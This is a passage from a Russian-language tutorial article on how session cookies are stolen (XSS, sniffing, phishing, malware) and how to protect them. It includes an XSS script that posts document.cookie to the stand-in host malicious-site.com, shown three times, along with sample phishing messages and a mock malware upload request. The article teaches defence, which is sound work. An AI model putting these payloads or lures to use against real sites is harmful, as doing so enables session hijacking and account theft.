    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Установите короткий срок действия для сессионных cookie, чтобы минимизировать их ценность для
                    злоумышленников.
    </li>
   </ul>
  </li>
 </ul>
 <p dir="auto">
  Cookie являются мощным инструментом для управления доступом и идентификации пользователей, но их
        использование требует тщательной настройки и соблюдения мер безопасности.
 </p>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Как злоумышленники могут украсть сессионные cookie?
  </h2>
 </div>
 <p dir="auto">
  Сессионные cookie являются важным элементом безопасности веб-приложений, но они также могут стать
        целью злоумышленников. Рассмотрим основные способы, которыми могут быть украдены сессионные cookie.
 </p>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   XSS (Cross-Site Scripting)
  </h3>
 </div>
 <p dir="auto">
  XSS (Cross-Site Scripting) — это тип атаки, при котором злоумышленник внедряет вредоносный скрипт в
        веб-страницу, которая затем выполняется в браузере жертвы. Эта атака позволяет злоумышленнику получить доступ к
        данным пользователя, включая сессионные cookie.
 </p>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Как вредоносный скрипт может получить доступ к cookie?
  </h4>
 </div>
 <p dir="auto">
  Когда веб-приложение не фильтрует или не экранирует пользовательский ввод, злоумышленник может
        внедрить JavaScript-код, который будет выполнен в браузере других пользователей. Этот код может использовать
        объект
  <code>
   document.cookie
  </code>
  для получения cookie текущей сессии.
 </p>
 <p dir="auto">
  Пример вредоносного скрипта:
 </p>
 <div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
        <span class="pl-en">fetch</span><span class="pl-kos">(</span><span class="pl-s">'https://malicious-site.com/steal-cookie'</span><span class="pl-kos">,</span> <span class="pl-kos">{</span>
            <span class="pl-c1">method</span>: <span class="pl-s">'POST'</span><span class="pl-kos">,</span>
            <span class="pl-c1">body</span>: <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span>
        <span class="pl-kos">}</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre>
 </div>
 <p dir="auto">
  Этот скрипт отправляет содержимое cookie на сервер злоумышленника. Если cookie содержит session ID,
        злоумышленник может использовать его для захвата сессии пользователя.
 </p>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Пример сценария атаки
  </h4>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Внедрение скрипта
    </strong>
    :
                Злоумышленник находит уязвимость XSS в веб-приложении, например, в форме комментариев. Он оставляет
                комментарий с вредоносным кодом:
   </p>
   <div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
        <span class="pl-en">fetch</span><span class="pl-kos">(</span><span class="pl-s">'https://malicious-site.com/steal-cookie'</span><span class="pl-kos">,</span> <span class="pl-kos">{</span>
            <span class="pl-c1">method</span>: <span class="pl-s">'POST'</span><span class="pl-kos">,</span>
            <span class="pl-c1">body</span>: <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span>
        <span class="pl-kos">}</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Выполнение скрипта
    </strong>
    :
                Когда другой пользователь открывает страницу с этим комментарием, браузер автоматически выполняет
                внедренный скрипт.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Кража cookie
    </strong>
    :
                Скрипт отправляет содержимое
    <code>
     document.cookie
    </code>
    на сервер злоумышленника. Например:
   </p>
   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
    <pre class="notranslate"><code>session_id=abc123; user_id=42
    </code></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Захват сессии
    </strong>
    :
                Злоумышленник использует украденный session ID для подделки запросов от имени жертвы. Это позволяет ему
                получить доступ к учетной записи пользователя без ввода пароля.
   </p>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Как защититься от XSS?
  </h4>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Экранирование пользовательского ввода
    </strong>
    :
                Всегда экранируйте данные, введенные пользователями, перед отображением их на странице. Например,
                используйте HTML-энкодинг для символов
    <code>
     &lt;
    </code>
    ,
    <code>
     &gt;
    </code>
    ,
    <code>
     &amp;
    </code>
    .
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Использование флага HttpOnly
    </strong>
    :
                Установите флаг
    <code>
     HttpOnly
    </code>
    для cookie, чтобы запретить доступ к ним через JavaScript:
   </p>
   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
    <pre class="notranslate"><code>Set-Cookie: session_id=abc123; HttpOnly
    </code></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Внедрение Content Security Policy (CSP)
    </strong>
    :
                CSP ограничивает выполнение скриптов только доверенными источниками. Например:
   </p>
   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
    <pre class="notranslate"><code>Content-Security-Policy: script-src 'self';
    </code></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Регулярное тестирование безопасности
    </strong>
    :
                Проводите аудит кода и используйте инструменты для поиска уязвимостей XSS.
   </p>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Сниффинг трафика
  </h3>
 </div>
 <p dir="auto">
  Сниффинг трафика — это метод перехвата данных, передаваемых между клиентом и сервером, с
        использованием сетевых анализаторов (снифферов). Если веб-приложение использует HTTP вместо HTTPS, данные
        передаются в незашифрованном виде, что делает их уязвимыми для перехвата злоумышленниками.
 </p>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Уязвимость при использовании HTTP вместо HTTPS
  </h4>
 </div>
 <p dir="auto">
  HTTP (HyperText Transfer Protocol) не обеспечивает шифрование данных, передаваемых между клиентом и
        сервером. Это означает, что любой, кто имеет доступ к сети, может перехватить передаваемые данные, включая
        cookie. В отличие от HTTP, HTTPS (HTTP Secure) использует шифрование с помощью протокола TLS (Transport Layer
        Security), что делает перехваченные данные бесполезными для злоумышленников.
 </p>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Как cookie могут быть перехвачены в открытых сетях?
  </h4>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Открытые Wi-Fi сети
    </strong>
    :
                В общественных местах, таких как кафе, аэропорты или гостиницы, злоумышленники могут использовать
                снифферы для мониторинга сетевого трафика. Если веб-приложение передает cookie через HTTP, злоумышленник
                может легко перехватить их.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Атака "Человек посередине" (Man-in-the-Middle)
    </strong>
    :
                Злоумышленник может вставить себя между клиентом и сервером, чтобы перехватывать и изменять данные.
                Например, он может перенаправить пользователя с HTTPS на HTTP, чтобы получить доступ к cookie.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Пример сценария атаки
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Пользователь подключается к открытой Wi-Fi сети в кафе.
    </li>
    <li>
     Злоумышленник запускает сниффер, чтобы мониторить трафик в этой сети.
    </li>
    <li>
     Пользователь заходит на сайт, который использует HTTP, и отправляет запрос с cookie:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>GET /dashboard HTTP/1.1
    Host: example.com
    Cookie: session_id=abc123
    </code></pre>
     </div>
    </li>
    <li>
     Злоумышленник перехватывает этот запрос и получает session ID, который может быть использован для
                    захвата сессии пользователя.
    </li>
   </ul>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Как защититься от сниффинга трафика?
  </h4>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Использование HTTPS
    </strong>
    :
                Всегда используйте HTTPS для шифрования данных. Убедитесь, что все страницы веб-приложения, включая
                страницы входа и передачи данных, защищены HTTPS.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Установка флага Secure для cookie
    </strong>
    :
                Установите флаг
    <code>
     Secure
    </code>
    для cookie, чтобы они передавались только через HTTPS:
   </p>
   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
    <pre class="notranslate"><code>Set-Cookie: session_id=abc123; Secure
    </code></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Избегайте использования открытых Wi-Fi сетей
    </strong>
    :
                Пользователи должны избегать подключения к открытым сетям без VPN. VPN (Virtual Private Network) шифрует
                весь трафик, делая его недоступным для злоумышленников.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     HSTS (HTTP Strict Transport Security)
    </strong>
    :
                Настройте HSTS для вашего веб-приложения, чтобы браузеры автоматически использовали HTTPS и
                предотвращали переход на HTTP:
   </p>
   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
    <pre class="notranslate"><code>Strict-Transport-Security: max-age=31536000; includeSubDomains
    </code></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Регулярное обновление сертификатов
    </strong>
    :
                Убедитесь, что SSL/TLS сертификаты вашего сайта актуальны и правильно настроены.
   </p>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Социальная инженерия
  </h3>
 </div>
 <p dir="auto">
  Социальная инженерия — это метод атаки, при котором злоумышленники используют психологические
        манипуляции, чтобы обманом заставить пользователя передать конфиденциальные данные, такие как сессионные cookie.
        Одним из самых распространенных методов социальной инженерии является фишинг.
 </p>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Фишинг и обман для получения cookie
  </h4>
 </div>
 <p dir="auto">
  Фишинг — это атака, при которой злоумышленник создает поддельный веб-сайт или отправляет обманное
        сообщение, чтобы заставить пользователя передать свои данные. В контексте сессионных cookie фишинг может быть
        использован для захвата session ID.
 </p>
 <p dir="auto">
  <strong>
   Как это работает
  </strong>
  :
 </p>
 <ol dir="auto">
  <li>
   Злоумышленник создает поддельный веб-сайт, который выглядит идентично настоящему сайту (например,
            интернет-банка или социальной сети).
  </li>
  <li>
   Пользователю отправляется письмо или сообщение с ссылкой на этот поддельный сайт. Сообщение может содержать
            текст, побуждающий пользователя перейти по ссылке, например:
   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
    <pre class="notranslate"><code>Уважаемый пользователь, ваш аккаунт был заблокирован. Пожалуйста, войдите в систему, чтобы восстановить доступ: https://fakebank.com/login
    </code></pre>
   </div>
  </li>
  <li>
   Пользователь переходит по ссылке и вводит свои учетные данные или выполняет действия, которые позволяют
            злоумышленнику получить доступ к его cookie.
  </li>
  <li>
   Злоумышленник использует украденные cookie для захвата сессии пользователя.
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Пример сценария атаки
  </h4>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Создание поддельного сайта
    </strong>
    :
                Злоумышленник создает сайт, который выглядит как настоящая страница входа в популярный сервис.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Отправка фишингового письма
    </strong>
    :
                Пользователю отправляется письмо с текстом:
   </p>
   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
    <pre class="notranslate"><code>Уважаемый клиент, для подтверждения вашей учетной записи выполните вход на нашем сайте: https://fake-login.com
    </code></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Кража cookie
    </strong>
    :
                Когда пользователь входит на поддельный сайт, скрипт на этом сайте захватывает его session ID и
                отправляет его злоумышленнику:
   </p>
   <div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
        <span class="pl-en">fetch</span><span class="pl-kos">(</span><span class="pl-s">'https://malicious-site.com/steal-cookie'</span><span class="pl-kos">,</span> <span class="pl-kos">{</span>
            <span class="pl-c1">method</span>: <span class="pl-s">'POST'</span><span class="pl-kos">,</span>
            <span class="pl-c1">body</span>: <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span>
        <span class="pl-kos">}</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Захват сессии
    </strong>
    :
                Злоумышленник использует украденный session ID для доступа к учетной записи пользователя.
   </p>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Как защититься от фишинга?
  </h4>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Обучение пользователей
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Пользователи должны быть обучены распознавать фишинговые письма и избегать перехода по
                    подозрительным ссылкам.
    </li>
    <li>
     Проверяйте URL-адреса перед вводом данных. Настоящие сайты используют HTTPS и имеют корректный
                    домен.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Двухфакторная аутентификация (2FA)
    </strong>
    :
                Даже если злоумышленник получит session ID, двухфакторная аутентификация может предотвратить доступ к
                учетной записи.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Использование антивирусного ПО
    </strong>
    :
                Современные антивирусные программы могут обнаруживать и блокировать фишинговые сайты.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Фильтрация ссылок
    </strong>
    :
                Настройте фильтры электронной почты для блокировки писем с подозрительными ссылками.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Регулярное обновление ПО
    </strong>
    :
                Убедитесь, что браузеры и операционные системы пользователей обновлены, чтобы минимизировать уязвимости.
   </p>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Кража через вредоносное ПО
  </h3>
 </div>
 <p dir="auto">
  Вредоносное ПО (malware) — это программы, созданные злоумышленниками для выполнения вредоносных
        действий на устройстве пользователя. Одной из целей такого ПО может быть кража локально сохраненных cookie,
        которые содержат session ID и другую конфиденциальную информацию.
 </p>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Как локальные cookie могут быть украдены?
  </h4>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Доступ к файлам браузера
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Большинство браузеров хранят cookie в локальных файлах на устройстве пользователя. Например:
     <ul dir="auto">
      <li>
       В Google Chrome cookie хранятся в зашифрованном виде в файле
       <code>
        Cookies
       </code>
       в профиле
                            пользователя.
      </li>
      <li>
       В Mozilla Firefox cookie хранятся в файле
       <code>
        cookies.sqlite
       </code>
       .
      </li>
     </ul>
    </li>
    <li>
     Вредоносное ПО может получить доступ к этим файлам и извлечь из них данные.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Использование кейлоггеров
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Кейлоггеры — это тип вредоносного ПО, который записывает нажатия клавиш. Они могут фиксировать
                    данные, вводимые пользователем, включая учетные данные для входа, которые затем используются для
                    получения cookie.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Эксплуатация уязвимостей системы
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Вредоносное ПО может использовать уязвимости операционной системы или браузера для обхода механизмов
                    защиты и получения доступа к cookie.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Передача украденных данных злоумышленнику
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     После извлечения cookie вредоносное ПО отправляет их на сервер злоумышленника, где они могут быть
                    использованы для захвата сессии пользователя.
    </li>
   </ul>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Пример сценария атаки
  </h4>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Установка вредоносного ПО
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Пользователь случайно загружает и устанавливает вредоносное ПО, замаскированное под легитимное
                    приложение, например, через фишинговую ссылку или зараженный файл.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Сканирование файлов cookie
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Вредоносное ПО сканирует локальные файлы браузера, извлекает cookie и расшифровывает их, если они
                    зашифрованы.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Передача данных
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Украденные cookie отправляются на сервер злоумышленника:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>POST /upload HTTP/1.1
    Host: malicious-site.com
    Cookie-Data: session_id=abc123; user_id=42
    </code></pre>
     </div>
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Захват сессии
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Злоумышленник использует украденные cookie для доступа к учетной записи пользователя.
    </li>
   </ul>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Как защититься от кражи через вредоносное ПО?
  </h4>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Использование антивирусного ПО
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Установите надежное антивирусное программное обеспечение и регулярно обновляйте его для защиты от
                    вредоносного ПО.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Обновление программного обеспечения
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Регулярно обновляйте операционную систему, браузеры и другие приложения, чтобы устранить уязвимости,
                    которые могут быть использованы вредоносным ПО.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Шифрование cookie
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Браузеры уже используют шифрование для хранения cookie. Убедитесь, что вы используете современные
                    версии браузеров, которые поддерживают эту функцию.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Ограничение времени жизни cookie
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Установите короткий срок действия для сессионных cookie, чтобы минимизировать их ценность для
                    злоумышленников:
     <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
      <pre class="notranslate"><code>Set-Cookie: session_id=abc123; Max-Age=3600; HttpOnly; Secure
    </code></pre>
     </div>
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Избегайте загрузки подозрительных файлов
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Не загружайте файлы из ненадежных источников и не открывайте вложения в подозрительных письмах.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Использование двухфакторной аутентификации (2FA)
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Даже если злоумышленник получит доступ к cookie, двухфакторная аутентификация может предотвратить
                    несанкционированный доступ.
    </li>
   </ul>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Заключение
  </h2>
 </div>
 <p dir="auto">
  Сессионные cookie играют важную роль в обеспечении удобства и безопасности пользователей в
        веб-приложениях. Однако они также являются одной из главных целей для злоумышленников. В этой статье мы
        рассмотрели, как работают сессионные cookie, какие угрозы им угрожают и как защитить их от атак.
 </p>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Резюме: важность защиты сессионных cookie
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Сессионные cookie обеспечивают идентификацию и авторизацию пользователей, но их кража может привести
                    к серьезным последствиям.
    </li>
    <li>
     Использование лучших практик, таких как HTTPS, флаги
     <code>
      HttpOnly
     </code>
     и
     <code>
      Secure
     </code>
     , а
                    также регулярное тестирование безопасности, помогает минимизировать риски.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Напоминание о том, что безопасность — это процесс, а не одноразовое действие
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Обеспечение безопасности — это непрерывный процесс, который требует постоянного внимания, обновлений
                    и адаптации к новым угрозам.
    </li>
    <li>
     Разработчики должны регулярно пересматривать свои подходы к безопасности и внедрять новые методы
                    защиты.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Призыв к использованию лучших практик безопасности
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Настройте cookie с учетом всех доступных флагов безопасности.
    </li>
    <li>
     Используйте двухфакторную аутентификацию для повышения уровня защиты.
    </li>
    <li>
     Обучайте пользователей основам кибербезопасности, чтобы они могли распознавать угрозы, такие как
                    фишинг.
    </li>
   </ul>
  </li>
 </ol>
 <p dir="auto">
  Безопасность — это совместная ответственность разработчиков, специалистов по безопасности и
        пользователей. Только работая вместе, мы можем создать безопасную цифровую среду для всех.
 </p>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Дополнительные материалы
  </h2>
 </div>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Ссылки на официальную документацию
  </h3>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     OWASP (Open Web Application Security Project)
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     <a href="https://owasp.org/www-project-top-ten/" rel="nofollow">
      OWASP Top Ten
     </a>
     : Список наиболее
                    критичных рисков безопасности веб-приложений.
    </li>
    <li>
     <a href="https://cheatsheetseries.owasp.org/" rel="nofollow">
      OWASP Cheat Sheet Series
     </a>
     :
                    Руководства по лучшим практикам безопасности.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Руководства по настройке cookie
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies" rel="nofollow">
      MDN Web Docs:
                        HTTP Cookies
     </a>
     : Подробное описание структуры и использования cookie.
    </li>
    <li>
     <a href="https://owasp.org/www-community/controls/SecureCookieAttribute" rel="nofollow">
      OWASP Secure
                        Cookie Storage
     </a>
     : Рекомендации по безопасному хранению cookie.
    </li>
   </ul>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Рекомендованные инструменты для тестирования безопасности
  </h3>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Burp Suite
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Мощный инструмент для тестирования безопасности веб-приложений.
    </li>
    <li>
     <a href="https://portswigger.net/burp" rel="nofollow">
      Официальный сайт
     </a>
     .
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     OWASP ZAP (Zed Attack Proxy)
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Бесплатный инструмент для анализа безопасности веб-приложений.
    </li>
    <li>
     <a href="https://owasp.org/www-project-zap/" rel="nofollow">
      Официальный сайт
     </a>
     .
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Postman
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     Инструмент для тестирования API, который может быть полезен для проверки безопасности запросов.
    </li>
    <li>
     <a href="https://www.postman.com/" rel="nofollow">
      Официальный сайт
     </a>
     .
    </li>
   </ul>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Статьи и книги по веб-безопасности
  </h3>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Статьи
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     <a href="https://security.googleblog.com/" rel="nofollow">
      Google Security Blog
     </a>
     : Обновления и
                    рекомендации по безопасности от Google.
    </li>
    <li>
     <a href="https://owasp.org/blog/" rel="nofollow">
      OWASP Blog
     </a>
     : Статьи и новости о
                    веб-безопасности.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Книги
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     "Web Application Security: Exploitation and Countermeasures for Modern Web Applications" — Andrew
                    Hoffman.
    </li>
    <li>
     "The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws" — Dafydd Stuttard,
                    Marcus Pinto.
    </li>
    <li>
     "Hacking APIs: Breaking Web Application Programming Interfaces" — Corey J. Ball.
    </li>
   </ul>
  </li>
 </ol>
 <p dir="auto">
  Эти материалы помогут углубить знания в области веб-безопасности и освоить инструменты для защиты
        веб-приложений.
 </p>
</article>
